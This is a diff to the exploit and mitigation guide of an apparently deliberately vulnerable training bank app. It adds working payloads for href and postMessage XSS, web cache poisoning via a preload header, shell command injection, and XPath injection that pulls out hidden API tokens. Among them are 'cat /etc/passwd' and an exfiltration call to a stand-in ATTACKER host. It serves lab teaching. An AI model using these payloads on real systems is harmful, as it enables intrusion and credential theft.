@@ -32,6 +32,8 @@ Hidden secret in JS bundle: sk_live_NOVATRUST_DEBUG_4242424242424242
  [06b] Reflected XSS — attribute context on search refine input (Ch 14)
  [06c] Reflected XSS — JavaScript-string context on /login ?next= (Ch 14)
  [06d] DOM XSS — location.search ?banner= sink (Ch 14)
+ [06e] Reflected XSS — javascript: URL (href) context on /accounts ?payto= (Ch 14)
+ [06f] DOM XSS — postMessage (no origin check) on statement print bridge (Ch 14)
 
  [07]  IDOR / BAC — view any account        (Ch 11)
  [08]  BAC — admin endpoints unprotected    (Ch 11)
@@ -91,6 +93,8 @@ Hidden secret in JS bundle: sk_live_NOVATRUST_DEBUG_4242424242424242
  [62]  Software & Data Integrity — POST /admin/integrity/install accepts unsigned plugin code → RCE (Ch 35)
  [63]  Logging & Monitoring — failed logins and SSN-view actions are not audited; /admin/audit reachable by any logged-in user; CRLF log forgery via /forgot email (Ch 36)
  [64]  Client-side / modern frontend — no CSP, no SRI on jQuery/Bootstrap CDNs, postMessage/origin checks missing in cross-frame admin tooling (Ch 37)
+ [65]  OS command injection — /admin/diagnostics ?host= → /bin/sh (Ch 12)
+ [66]  XPath injection — /admin/directory ?name= over staff-directory.xml (Ch 12)
 
 
 --------------------------------------------------------------------------------
@@ -349,6 +353,42 @@ MITIGATION
   Use `textContent`, or sanitise the value via DOMPurify before assigning
   to `innerHTML`. Better: do not read URL state into the DOM at all without
   a strict allow-list of values.
+
+--------------------------------------------------------------------------------
+ [06e] Reflected XSS — javascript: URL (href) context on /accounts ?payto=
+--------------------------------------------------------------------------------
+File:       routes/accounts.js (payto passed raw) + views/accounts.ejs
+            (<a href="<%- payto %>">continue to biller</a>)
+
+EXPLOIT (payto is dropped into an href with no scheme check, so a javascript:
+URL runs when the "resume payment" link is followed)
+  http://localhost:3001/accounts?payto=javascript:confirm(document.domain)
+  Follow the "continue to biller »" link. The confirm() dialog proves
+  execution. A href sink needs a click (unlike an onerror sink), so it is a
+  good place to demonstrate a modal other than alert().
+
+MITIGATION
+  Allow-list URL schemes to {http, https, mailto}; reject javascript:, data:,
+  and vbscript:. HTML-escape the value inside the attribute.
+
+--------------------------------------------------------------------------------
+ [06f] DOM XSS — postMessage with no origin check (statement print bridge)
+--------------------------------------------------------------------------------
+File:       public/js/app.js (window.addEventListener('message', ...) ->
+            #print-status innerHTML)
+
+EXPLOIT (the print-preview bridge accepts a postMessage from any origin and
+drops it into innerHTML; host an attacker page that frames the bank)
+  <iframe id=f src="http://localhost:3001/accounts"></iframe>
+  <script>
+    f.onload = () => f.contentWindow.postMessage(
+      '<img src=x onerror=confirm(document.domain)>', '*');
+  </script>
+  Open the attacker page in a browser already logged into the bank.
+
+MITIGATION
+  Check e.origin against an allow-list before trusting a message; render the
+  status text with textContent, never innerHTML.
 
 --------------------------------------------------------------------------------
  [07] IDOR / BAC — view any account
@@ -694,14 +734,28 @@ MITIGATION
  [32] Cache poisoning — X-Forwarded-Host echoed in Link header
 --------------------------------------------------------------------------------
 Endpoint:   GET /admin (returns `Link: <https://<XFH>/admin>; rel="canonical"`)
+            Fronted by the deliberately MISCONFIGURED `cache` service on :8001
+            (see docker-compose.yml + cache/cache-proxy.js). It caches GET
+            responses keyed ONLY on the URL path, so the unkeyed
+            X-Forwarded-Host still changes the cached response.
 
-EXPLOIT
+EXPLOIT (header reflection)
   curl -H 'X-Forwarded-Host: attacker.com' http://localhost:3001/admin -I
-  Subsequent cached responses inherit the poisoned Link → SEO/canonical hijack.
+
+EXPLOIT (real web-cache poisoning via the :8001 cache)
+  # 1. Prime the cache with a preload break-out (any logged-in session):
+  curl -b cookies.txt -I \
+    -H 'X-Forwarded-Host: evil.example/x>; rel="preload"; as="script"</bait' \
+    http://localhost:8001/admin        # -> X-Cache: MISS, poisoned Link stored
+  # 2. Victim (cookie-less) fetches the same path:
+  curl -I http://localhost:8001/admin  # -> X-Cache: HIT, same poisoned Link
+  A browser receiving `rel="preload"; as="script"` fetches and RUNS the
+  attacker script in the bank's origin.
 
 MITIGATION
   Don't trust upstream proxy headers unless you control the proxy. Compute
-  the canonical URL from a configured base, not from request headers.
+  the canonical URL from a configured base, not from request headers. Vary
+  the cache on X-Forwarded-Host (and Host), or strip it at the edge.
 
 --------------------------------------------------------------------------------
  [33] Debug endpoint exposed
@@ -1205,6 +1259,66 @@ MITIGATION
   - Alert on patterns: N failed logins from one IP, M SSN reads in
     one minute, audit_log write failures.
 
+
+--------------------------------------------------------------------------------
+ [65] OS command injection — /admin/diagnostics ?host=
+--------------------------------------------------------------------------------
+Endpoint:   GET /admin/diagnostics?host=<HOST>
+Files:      routes/admin.js (diagnostics handler), views/diagnostics.ejs
+Auth:       admin session, OR header  X-Support-Token: ENG-OVERRIDE-2024-ALL-ACCESS
+
+WHY IT IS VULNERABLE
+  The handler builds   `ping -c 1 -W 2 ${host}`   and runs it through
+  execSync(cmd, { shell: '/bin/sh' }). The host string is never validated, so
+  any shell metacharacter in ?host= is interpreted by /bin/sh.
+
+EXPLOIT (chain a second command)
+  curl -H 'X-Support-Token: ENG-OVERRIDE-2024-ALL-ACCESS' \
+    'http://localhost:3001/admin/diagnostics?host=127.0.0.1;id'
+  Other separators all work:
+    127.0.0.1 | id
+    127.0.0.1 && cat /etc/passwd
+    $(whoami)
+    `uname -a`
+  Blind/OOB variant (no output reflected):
+    127.0.0.1; curl http://ATTACKER/$(id|base64)
+
+MITIGATION
+  Never build a shell string from user input. Pass arguments as a vector and
+  skip the shell entirely:
+    execFile('ping', ['-c', '1', '-W', '2', host])   // no shell
+  Plus: validate `host` against a hostname/IP allow-list.
+
+--------------------------------------------------------------------------------
+ [66] XPath injection — /admin/directory ?name=
+--------------------------------------------------------------------------------
+Endpoint:   GET /admin/directory?name=<NAME>
+Files:      routes/admin.js (directory handler), data/staff-directory.xml,
+            views/directory.ejs
+Auth:       admin session, OR header  X-Support-Token: ENG-OVERRIDE-2024-ALL-ACCESS
+
+WHY IT IS VULNERABLE
+  The handler builds the XPath  //employee[username/text()='${name}']  and runs
+  it against staff-directory.xml. A closed quote lets the attacker rewrite the
+  predicate. The XML holds hidden  <clearance>  and  <api_token>  fields (e.g.
+  nt_live_root_0000deadbeefcafe) that the template never prints — but they are
+  reachable through the injected expression.
+
+EXPLOIT
+  Return every employee:
+    ?name=' or '1'='1
+  Boolean oracle (blind):
+    ?name=nobody' or count(//employee)>3 or 'a'='b
+  Confirm the backup service-account token starts with 'nt_live_root':
+    ?name=nobody' or //employee[username/text()='svc-backup' and
+          starts-with(api_token/text(),'nt_live_root')] or 'a'='b
+  Node-set union to surface tokens in the result rows:
+    ?name='] | //employee/api_token | a['
+
+MITIGATION
+  Use a parameterised/precompiled XPath that binds the value out of band
+  (xpath.parse(expr).evaluate with a variable resolver), or strictly escape
+  quotes. Better: stop storing secrets next to directory data.
 
 ================================================================================
  Reproducibility note
